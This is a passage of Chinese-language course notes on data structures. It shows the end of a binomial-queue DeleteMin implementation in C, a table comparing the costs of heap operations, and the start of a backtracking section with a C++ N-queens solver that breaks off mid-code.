<div class="language-c highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-ads-wk4-__codelineno-10-1"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MinTree</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">--</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#note-ads-wk4-__codelineno-10-2"></a><span class="w">    </span><span class="n">DeletedQueue</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeletedTree</span><span class="p">;</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#note-ads-wk4-__codelineno-10-3"></a><span class="w">    </span><span class="n">DeletedTree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeletedTree</span><span class="o">-&gt;</span><span class="n">NextSibling</span><span class="p">;</span>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#note-ads-wk4-__codelineno-10-4"></a><span class="w">    </span><span class="n">DeletedQueue</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">NextSibling</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#note-ads-wk4-__codelineno-10-5"></a><span class="p">}</span>
</span></code></pre></div></p>
<ul>
<li>从<code>MinTree-1</code>到<code>0</code>，将拆分出的树依次放入<code>DeletedQueue</code>中。</li>
<li>将每棵树的<code>NextSibling</code>设为NULL，以正确断开链表。</li>
</ul>
<p><strong>更新原队列的大小并合并</strong>
<div class="language-c highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-ads-wk4-__codelineno-11-1"></a><span class="n">H</span><span class="o">-&gt;</span><span class="n">CurrentSize</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">DeletedQueue</span><span class="o">-&gt;</span><span class="n">CurrentSize</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#note-ads-wk4-__codelineno-11-2"></a><span class="n">H</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Merge</span><span class="p">(</span><span class="n">H</span><span class="p">,</span><span class="w"> </span><span class="n">DeletedQueue</span><span class="p">);</span>
</span></code></pre></div></p>
<ul>
<li>从原队列<code>H</code>的当前大小中减去<code>DeletedQueue</code>的大小以及1（因为删除了一个根）。</li>
<li>调用<code>Merge</code>函数将<code>H</code>和<code>DeletedQueue</code>合并，更新原队列。</li>
</ul>
<p><strong>返回最小元素</strong></p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-ads-wk4-__codelineno-12-1"></a><span class="k">return</span><span class="w"> </span><span class="n">MinItem</span><span class="p">;</span>
</span></code></pre></div>
<ul>
<li>返回找到的最小元素。</li>
</ul>
</details>
<h2 id="note-ads-wk4-_5">堆性能的总结(单步摊还代价)<a class="headerlink" href="#note-ads-wk4-_5" title="Permanent link">&para;</a></h2>
<table>
<thead>
<tr>
<th>Operation</th>
<th>Binary Heap</th>
<th>Leftist Heap</th>
<th>Skew Heap</th>
<th>Binomial Heap</th>
<th>Fibonacci Heap</th>
</tr>
</thead>
<tbody>
<tr>
<td>Insert</td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(1)\)</span></td>
<td><span class="arithmatex">\(O(1)\)</span></td>
</tr>
<tr>
<td>Merge</td>
<td><span class="arithmatex">\(O(n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(1)\)</span></td>
</tr>
<tr>
<td>DeleteMin</td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
</tr>
<tr>
<td>Delete</td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
</tr>
<tr>
<td>DecreaseKey</td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td></td>
<td><span class="arithmatex">\(O(\log n)\)</span></td>
<td><span class="arithmatex">\(O(1)\)</span></td>
</tr>
</tbody>
</table></section><section class="print-page" id="note-ads-wk5" heading-number="2.2.3.7"><h1 id="note-ads-wk5-backtracking">Backtracking(回溯算法)<a class="headerlink" href="#note-ads-wk5-backtracking" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 226 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 90 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 2 分钟</p>
</div>
<div class="admonition section">
<p class="admonition-title">回溯算法</p>
<p>回溯算法是一种算法技术，通过逐步尝试部分解决方案来解决问题，如果某个部分解决方案不满足问题的约束条件，就会放弃它。它会探索所有可能的解决方案，并排除那些不符合条件的选项。</p>
</div>
<h2 id="note-ads-wk5-_1">八皇后问题<a class="headerlink" href="#note-ads-wk5-_1" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">八皇后问题</p>
<p>八皇后问题是一个经典的组合优化问题，目标是在一个 8×8 的国际象棋棋盘上放置 8 个皇后，使得它们彼此之间无法攻击。换句话说，任何两个皇后不能在同一行、同一列或同一对角线上。</p>
</div>
<p>k皇后问题是八皇后问题的一般化，即在一个 n×n 的棋盘上放置 k 个皇后，使得它们彼此之间无法攻击。</p>
<details class="advice">
<summary>个人cpp代码</summary>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk5-__codelineno-0-1"></a><span class="cp">#include</span><span class="cpf">&lt;iostream&gt;</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk5-__codelineno-0-2"></a><span class="cp">#include</span><span class="cpf">&lt;vector&gt;</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk5-__codelineno-0-3"></a><span class="k">class</span><span class="w"> </span><span class="nc">Game</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk5-__codelineno-0-4"></a><span class="p">{</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ads-wk5-__codelineno-0-5"></a><span class="w">    </span><span class="k">public</span><span class="o">:</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ads-wk5-__codelineno-0-6"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">Number</span><span class="p">;</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ads-wk5-__codelineno-0-7"></a><span class="w">    </span><span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">solutions</span><span class="p">;</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ads-wk5-__codelineno-0-8"></a><span class="w">    </span><span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Queen_setRow</span><span class="p">;</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ads-wk5-__codelineno-0-9"></a><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="p">);</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-ads-wk5-__codelineno-0-10"></a><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">find_solution</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">row</span><span class="p">);</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-ads-wk5-__codelineno-0-11"></a><span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="nf">is_safe</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">row</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">col</span><span class="p">);</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-ads-wk5-__codelineno-0-12"></a><span class="p">};</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-ads-wk5-__codelineno-0-13"></a>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#note-ads-wk5-__codelineno-0-14"></a>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#note-ads-wk5-__codelineno-0-15"></a><span class="kt">void</span><span class="w"> </span><span class="nf">Game::init</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="p">)</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#note-ads-wk5-__codelineno-0-16"></a><span class="p">{</span>
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#note-ads-wk5-__codelineno-0-17"></a><span class="w">    </span><span class="n">Number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">N</span><span class="p">;</span>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#note-ads-wk5-__codelineno-0-18"></a><span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;</span><span class="n">N</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#note-ads-wk5-__codelineno-0-19"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#note-ads-wk5-__codelineno-0-20"></a><span class="w">        </span><span class="n">Queen_setRow</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#note-ads-wk5-__codelineno-0-21"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#note-ads-wk5-__codelineno-0-22"></a><span class="p">}</span>
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#note-ads-wk5-__codelineno-0-23"></a><span class="kt">bool</span><span class="w"> </span><span class="nf">Game::is_safe</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">row</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">col</span><span class="p">)</span>
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#note-ads-wk5-__codelineno-0-24"></a><span class="p">{</span>
</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#note-ads-wk5-__codelineno-0-25"></a><span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;</span><span class="n">row</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#note-ads-wk5-__codelineno-0-26"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#note-ads-wk5-__codelineno-0-27"></a><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">Queen_setRow</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">col</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">abs</span><span class="p">(</span><span class="n">Queen_setRow</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">col</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">abs</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">row</span><span class="p">))</span>
</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#note-ads-wk5-__codelineno-0-28"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#note-ads-wk5-__codelineno-0-29"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#note-ads-wk5-__codelineno-0-30"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#note-ads-wk5-__codelineno-0-31"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#note-ads-wk5-__codelineno-0-32"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#note-ads-wk5-__codelineno-0-33"></a><span class="p">}</span>
</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#note-ads-wk5-__codelineno-0-34"></a>
</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#note-ads-wk5-__codelineno-0-35"></a>
</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#note-ads-wk5-__codelineno-0-36"></a><span class="kt">void</span><span class="w"> </span><span class="nf">Game::find_solution</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">row</span><span class="p">)</span>
</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#note-ads-wk5-__codelineno-0-37"></a><span class="p">{</span>
</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#note-ads-wk5-__codelineno-0-38"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">row</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Number</span><span class="p">)</span>
</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#note-ads-wk5-__codelineno-0-39"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#note-ads-wk5-__codelineno-0-40"></a><span class="w">        </span><span class="n">solutions</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">Queen_setRow</span><span class="p">);</span>
</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#note-ads-wk5-__codelineno-0-41"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#note-ads-wk5-__codelineno-0-42"></a>
</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#note-ads-wk5-__codelineno-0-43"></a><span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#note-ads-wk5-__codelineno-0-44"></a><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">col</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">col</span><span class="o">&lt;</span><span class="n">Number</span><span class="p">;</span><span class="w"> </span><span class="n">col</span><span class="o">++</span><span class="p">)</span>
</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#note-ads-wk5-__codelineno-0-45"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#note-ads-wk5-__codelineno-0-46"></a><span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">is_safe</span><span class="p">(</span><span class="n">row</span><span class="p">,</span><span class="w"> </span><span class="n">col</span><span class="p">))</span>
</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#note-ads-wk5-__codelineno-0-47"></a><span class="w">            </span><span class="p">{</span>
</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#note-ads-wk5-__codelineno-0-48"></a><span class="w">                </span><span class="n">Queen_setRow</span><span class="p">[</span><span class="n">row</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">col</span><span class="p">;</span>
</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#note-ads-wk5-__codelineno-0-49"></a><span class="w">                </span><span class="n">find_solution</span><span class="p">(</span><span class="n">row</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#note-ads-wk5-__codelineno-0-50"></a><span class="w">                </span><span class="n">Queen_setRow</span><span class="p">[</span><span class="n">row</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#note-ads-wk5-__codelineno-0-51"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#note-ads-wk5-__codelineno-0-52"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#note-ads-wk5-__codelineno-0-53"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#note-ads-wk5-__codelineno-0-54"></a><span class="p">}</span>
</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#note-ads-wk5-__codelineno-0-55"></a>
</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#note-ads-wk5-__codelineno-0-56"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span>
</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#note-ads-wk5-__codelineno-0-57"></a><span class="p">{</span>
</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#note-ads-wk5-__codelineno-0-58"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="p">;</span>
</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#note-ads-wk5-__codelineno-0-59"></a><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">N</span><span class="p">);</span>
</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#note-ads-wk5-__codelineno-0-60"></a><span class="w">    </span><span class="n">Game</span><span class="w"> </span><span class="n">chess</span><span class="p">;</span>
</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#note-ads-wk5-__codelineno-0-61"></a><span class="w">    </span><span class="n">chess</span><span class="p">.</span><span class="n">init</span><span class="p">(</span><span class="n">N</span><span class="p">);</span>
</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62" href="#note-ads-wk5-__codelineno-0-62"></a><span class="w">    </span><span class="n">chess</span><span class="p">.</span><span class="n">find_solution</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63" href="#note-ads-wk5-__codelineno-0-63"></a>
</span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64" href="#note-ads-wk5-__codelineno-0-64"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">chess</span><span class="p">.</span><span class="n">solutions</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span>
</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65" href="#note-ads-wk5-__codelineno-0-65"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66" href="#note-ads-wk5-__codelineno-0-66"></a><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">chess</span><span class="p">.</span><span class="n">solutions</span><span class="p">.</span><span class="n">size</span><span class="p">();</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span id="__span-0-67"><a id="__codelineno-0-67" name="__codelineno-0-67" href="#note-ads-wk5-__codelineno-0-67"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-0-68"><a id="__codelineno-0-68" name="__codelineno-0-68" href="#note-ads-wk5-__codelineno-0-68"></a><span class="w">            </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">&lt;</span><span class="n">chess</span><span class="p">.</span><span class="n">solutions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">size</span><span class="p">();</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span><span id="__span-0-69"><a id="__codelineno-0-69" name="__codelineno-0-69" href="#note-ads-wk5-__codelineno-0-69"></a><span class="w">            </span><span class="p">{</span>
</span><span id="__span-0-70"><a id="__codelineno-0-70" name="__codelineno-0-70" href="#note-ads-wk5-__codelineno-0-70"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">chess</span><span class="p">.</span><span class="n">solutions</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span><span id="__span-0-71"><a id="__codelineno-0-71" name="__codelineno-0-71" href="#note-ads-wk5-__codelineno-0-71"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-0-72"><a id="__codelineno-0-72" name="__codelineno-0-72" href="#note-ads-wk5-__codelineno-0-72"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span id="__span-0-73"><a id="__codelineno-0-73" name="__codelineno-0-73" href="#note-ads-wk5-__codelineno-0-73"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-0-74"><a id="__codelineno-0-74" name="__codelineno-0-74" href="#note-ads-wk5-__codelineno-0-74"></a><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">k</span><span class="o">&lt;</span><span class="mi">3</span><span class="o">-</span><span class="n">chess</span><span class="p">.</span><span class="n">solutions</span><span class="p">.</span><span class="n">size</span><span class="p">();</span><span class="n">k</span><span class="o">++</span><span class="p">)</span>
</span><span id="__span-0-75"><a id="__codelineno-0-75" name="__codelineno-0-75" href="#note-ads-wk5-__codelineno-0-75"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-0-76"><a id="__codelineno-0-76" name="__codelineno-0-76" href="#note-ads-wk5-__codelineno-0-76"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span id="__span-0-77"><a id="__codelineno-0-77" name="__codelineno-0-77" href="#note-ads-wk5-__codelineno-0-77"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-0-78"><a id="__codelineno-0-78" name="__codelineno-0-78" href="#note-ads-wk5-__codelineno-0-78"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-79"><a id="__codelineno-0-79" name="__codelineno-0-79" href="#note-ads-wk5-__codelineno-0-79"></a><span class="w">    </span><span class="k">else</span><span class="p">{</span>
</span><span id="__span-0-80"><a id="__codelineno-0-80" name="__codelineno-0-80" href="#note-ads-wk5-__codelineno-0-80"></a><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;</span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span id="__span-0-81"><a id="__codelineno-0-81" name="__codelineno-0-81" href="#note-ads-wk5-__codelineno-0-81"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-0-82"><a id="__codelineno-0-82" name="__codelineno-0-82" href="#note-ads-wk5-__codelineno-0-82"></a><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">&lt;</span><span class="n">chess</span><span class="p">.</span><span class="n">solutions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">size</span><span class="p">();</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span><span id="__span-0-83"><a id="__codelineno-0-83" name="__codelineno-0-83" href="#note-ads-wk5-__codelineno-0-83"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-0-84"><a id="__codelineno-0-84" name="__codelineno-0-84" href="#note-ads-wk5-__codelineno-0-84"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">chess</span><span class="p">.</span><span class="n">solutions</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
